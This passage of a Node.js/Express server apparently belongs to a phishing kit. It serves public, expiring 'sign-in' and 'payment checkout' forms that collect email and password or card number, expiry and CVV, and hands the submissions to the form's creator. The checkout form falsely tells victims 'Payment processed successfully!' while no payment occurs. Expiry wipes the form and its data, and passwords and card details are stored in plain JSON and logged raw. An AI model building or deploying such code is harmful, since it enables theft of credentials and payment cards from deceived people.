    if (isNaN(maxForms) || maxForms < 1) {
      return res.status(400).json({ error: 'Invalid max forms value' });
    }

    settings.maxFormsPerUser = parseInt(maxForms);
    await saveSettings();
    console.log(`Set max forms per user to ${maxForms}`);
    res.status(200).json({ message: 'Max forms per user updated successfully' });
  } catch (error) {
    console.error('Error setting max forms:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to set max forms', details: error.message });
  }
});

// Form route with expiry check
app.get('/form/:id', async (req, res) => {
  const formId = req.params.id;
  const config = formConfigs[formId];
  
  if (!config) {
    console.error(`Form not found for ID: ${formId}`);
    return res.status(404).send('Form not found');
  }

  if (config.expiryTime && new Date(config.expiryTime) <= new Date()) {
    delete formConfigs[formId];
    await saveFormConfigs();
    
    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
    const updatedSubmissions = submissions.filter(s => s.formId !== formId);
    await fs.writeFile(submissionsFile, JSON.stringify(updatedSubmissions, null, 2));
    
    console.error(`Form ${formId} has expired`);
    return res.status(410).send('Form has expired');
  }

  const templates = {
    'sign-in': {
      name: 'Sign In Form',
      fields: [
        { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
        { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
      ],
      buttonText: 'Sign In',
      buttonAction: 'url',
      buttonUrl: '',
      buttonMessage: ''
    },
    'contact': {
      name: 'Contact Form',
      fields: [
        { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
        { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
      ],
      buttonText: 'Submit',
      buttonAction: 'message',
      buttonUrl: '',
      buttonMessage: 'Thank you for contacting us!'
    },
    'payment-checkout': {
      name: 'Payment Checkout Form',
      fields: [
        { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
        { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
        { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
      ],
      buttonText: 'Pay Now',
      buttonAction: 'message',
      buttonUrl: '',
      buttonMessage: 'Payment processed successfully!'
    }
  };

  const template = templates[config.template] || templates['sign-in'];
  const fields = template.fields.map(field => {
    const customField = config.placeholders.find(p => p.id === field.id);
    return {
      ...field,
      placeholder: customField ? customField.placeholder : field.placeholder
    };
  });

  config.placeholders.forEach(p => {
    if (!fields.some(f => f.id === p.id)) {
      fields.push({
        id: p.id,
        placeholder: p.placeholder || template.fields.find(f => f.id === p.id)?.placeholder || 'Enter value',
        type: 'text',
        validation: { required: false }
      });
    }
  });

  const inputCount = fields.length;
  const minHeight = `${300 + (inputCount - template.fields.length) * 40}px`;

  const headerHtml = config.headerText.split('').map((char, i) => {
    if (char === ' ') return '<span class="space"> </span>';
    const color = config.headerColors[i - config.headerText.slice(0, i).split(' ').length + 1] || '';
    return `<span style="color: ${sanitizeForJs(color)}">${sanitizeForJs(char)}</span>`;
  }).join('');

  try {
    const html = ejs.render(formTemplate, {
      templateName: sanitizeForJs(template.name),
      headerHtml,
      subheaderText: sanitizeForJs(config.subheaderText),
      subheaderColor: sanitizeForJs(config.subheaderColor),
      fields,
      borderShadow: sanitizeForJs(config.borderShadow),
      buttonColor: sanitizeForJs(config.buttonColor),
      buttonTextColor: sanitizeForJs(config.buttonTextColor),
      buttonText: sanitizeForJs(config.buttonText),
      buttonAction: sanitizeForJs(config.buttonAction),
      buttonUrl: sanitizeForJs(config.buttonUrl || ''),
      buttonMessage: sanitizeForJs(config.buttonMessage || ''),
      theme: config.theme,
      minHeight,
      template: config.template,
      formId,
      templates: JSON.stringify(templates, (key, value) => {
        if (key === 'regex' && value) return value.toString().slice(1, -1);
        return value;
      })
    });

    res.set('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error('Error rendering form:', error.message, error.stack);
    res.status(500).send('Error rendering form');
  }
});

// Get user forms and submissions
app.get('/get', verifyToken, async (req, res) => {
  try {
    const userId = req.user.userId;
    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
    const userSubmissions = submissions.filter(s => s.userId === userId);
    const userFormConfigs = {};
    Object.entries(formConfigs).forEach(([formId, config]) => {
      if (config.userId === userId && (!config.expiryTime || new Date(config.expiryTime) > new Date())) {
        userFormConfigs[formId] = config;
      }
    });

    const templates = {
      'sign-in': {
        name: 'Sign In Form',
        fields: [
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
        ]
      },
      'contact': {
        name: 'Contact Form',
        fields: [
          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
        ]
      },
      'payment-checkout': {
        name: 'Payment Checkout Form',
        fields: [
          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
        ]
      }
    };

    console.log(`Retrieved ${userSubmissions.length} submissions and ${Object.keys(userFormConfigs).length} forms for user ${userId}`);
    res.json({
      submissions: userSubmissions.reverse(),
      formConfigs: userFormConfigs,
      templates,
      userId
    });
  } catch (error) {
    console.error('Error fetching data for /get:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to fetch data', details: error.message });
  }
});

// Submit form data
app.post('/form/:id/submit', async (req, res) => {
  const formId = req.params.id;
  
  if (!formConfigs[formId]) {
    console.error(`Form not found for ID: ${formId}`);
    return res.status(404).json({ error: 'Form not found' });
  }

  if (formConfigs[formId].expiryTime && new Date(formConfigs[formId].expiryTime) <= new Date()) {
    delete formConfigs[formId];
    await saveFormConfigs();
    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
    const updatedSubmissions = submissions.filter(s => s.formId !== formId);
    await fs.writeFile(submissionsFile, JSON.stringify(updatedSubmissions, null, 2));
    console.error(`Form ${formId} has expired`);
    return res.status(410).json({ error: 'Form has expired' });
  }

  try {
    const formData = req.body;
    const config = formConfigs[formId];
    const userId = config.userId;
    const templates = {
      'sign-in': {
        name: 'Sign In Form',
        fields: [
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
        ]
      },
      'contact': {
        name: 'Contact Form',
        fields: [
          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
        ]
      },
      'payment-checkout': {
        name: 'Payment Checkout Form',
        fields: [
          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
        ]
      }
    };

    const template = templates[config.template] || templates['sign-in'];

    for (const field of template.fields) {
      if (field.validation && field.validation.required && !formData[field.id]) {
        console.error(`Missing required field: ${field.id}`);
        return res.status(400).json({ error: `Missing required field: ${field.id}` });
      }
      if (field.validation && field.validation.regex && formData[field.id]) {
        try {
          const regex = new RegExp(field.validation.regex);
          if (!regex.test(formData[field.id])) {
            console.error(`Invalid format for field: ${field.id}`);
            return res.status(400).json({ error: field.validation.errorMessage });
          }
        } catch (e) {
          console.error(`Invalid regex for field ${field.id}:`, e);
          return res.status(400).json({ error: `Invalid regex for field: ${field.id}` });
        }
      }
    }

    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
    submissions.push({
      userId,
      formId,
      data: Object.entries(formData).map(([key, value]) => ({
        field: key,
        value: sanitizeForJs(value)
      })),
      timestamp: new Date().toISOString()
    });

    await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
    console.log(`Stored submission for form ${formId} by user ${userId}:`, formData);
    res.status(200).json({ message: 'Form submitted successfully' });
  } catch (error) {
    console.error('Error submitting form:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to submit form', details: error.message });
  }
});

// Delete submission
app.delete('/form/:id/submission/:index', verifyToken, async (req, res) => {
  const formId = req.params.id;
  const index = parseInt(req.params.index, 10);
  const userId = req.user.userId;

  try {
    if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
      console.error(`User ${userId} does not have access to form ${formId}`);
      return res.status(403).json({ error: 'Access denied: Form does not belong to you' });
    }

    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
    const userFormSubmissions = submissions.filter(s => s.userId === userId && s.formId === formId);

    if (index < 0 || index >= userFormSubmissions.length) {
      console.error(`Invalid submission index: ${index} for form ${formId} by user ${userId}`);
      return res.status(404).json({ error: 'Submission not found' });
    }

    const submissionToDelete = userFormSubmissions[index];
    const globalIndex = submissions.findIndex(s => 
      s.userId === userId && s.formId === formId && s.timestamp === submissionToDelete.timestamp
    );

    if (globalIndex === -1) {
      console.error(`Submission not found for form ${formId} at index ${index} by user ${userId}`);
      return res.status(404).json({ error: 'Submission not found' });
    }

    submissions.splice(globalIndex, 1);
    await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
    console.log(`Deleted submission at index ${index} for form ${formId} by user ${userId}`);

    res.status(200).json({ message: 'Submission deleted successfully' });
  } catch (error) {
    console.error('Error deleting submission:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to delete submission', details: error.message });
  }
});

// Delete form
app.delete('/form/:id', verifyToken, async (req, res) => {
  const formId = req.params.id;
  const userId = req.user.userId;

  try {
    if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
      console.error(`User ${userId} does not have access to form ${formId}`);
      return res.status(404).json({ error: 'Form not found or access denied' });
    }

    delete formConfigs[formId];
    await saveFormConfigs();

    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
    const updatedSubmissions = submissions.filter(s => 
      !(s.userId === userId && s.formId === formId)
    );
    await fs.writeFile(submissionsFile, JSON.stringify(updatedSubmissions, null, 2));
    console.log(`Deleted form ${formId} and its submissions for user ${userId}`);

    res.status(200).json({ message: 'Form and associated submissions deleted successfully' });
  } catch (error) {
    console.error('Error deleting form:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to delete form', details: error.message });
  }
});

// Get submissions
app.get('/submissions', verifyToken, async (req, res) => {
  try {
    const userId = req.user.userId;
    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
    const userSubmissions = submissions.filter(s => s.userId === userId);

    const templates = {
      'sign-in': {
        name: 'Sign In Form',
        fields: [
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
        ]
      },
      'contact': {
        name: 'Contact Form',
        fields: [
          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
        ]
      },
      'payment-checkout': {
        name: 'Payment Checkout Form',
        fields: [
          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
        ]
      }
    };

    console.log(`Retrieved ${userSubmissions.length} submissions for user ${userId}`);
    res.json({
      submissions: userSubmissions.reverse(),
      templates,
      userId
    });
  } catch (error) {
    console.error('Error fetching submissions:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to fetch submissions', details: error.message });
  }
});

// Get form configuration
app.get('/api/form/:id', verifyToken, async (req, res) => {
  const formId = req.params.id;
  const userId = req.user.userId;

  try {
    const config = formConfigs[formId];
    if (!config) {
      console.error(`Form not found for ID: ${formId}`);
      return res.status(404).json({ error: 'Form not found' });
    }
    if (config.userId !== userId) {
      console.error(`User ${userId} does not have access to form ${formId}`);
      return res.status(403).json({ error: 'Access denied: Form does not belong to you' });
    }

    if (config.expiryTime && new Date(config.expiryTime) <= new Date()) {
      delete formConfigs[formId];
      await saveFormConfigs();
      const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
      const updatedSubmissions = submissions.filter(s => s.formId !== formId);
      await fs.writeFile(submissionsFile, JSON.stringify(updatedSubmissions, null, 2));
      console.error(`Form ${formId} has expired`);
      return res.status(410).json({ error: 'Form has expired' });
    }

    console.log(`Retrieved form config for ${formId} for user ${userId}`);
    res.status(200).json({
      ...config,
      formId,
      message: 'Form configuration retrieved successfully'
    });
  } catch (error) {
    console.error('Error fetching form config for /api/form/:id:', error.message, error.stack);
    res.status(500).json({ error: 'Failed to fetch form configuration', details: error.message });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('Unexpected error:', err.message, err.stack);
  res.status(500).json({ error: 'An unexpected error occurred', details: err.message });
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
}).on('error', (error) => {
  console.error('Server startup error:', error.message, error.stack);
  process.exit(1);
});
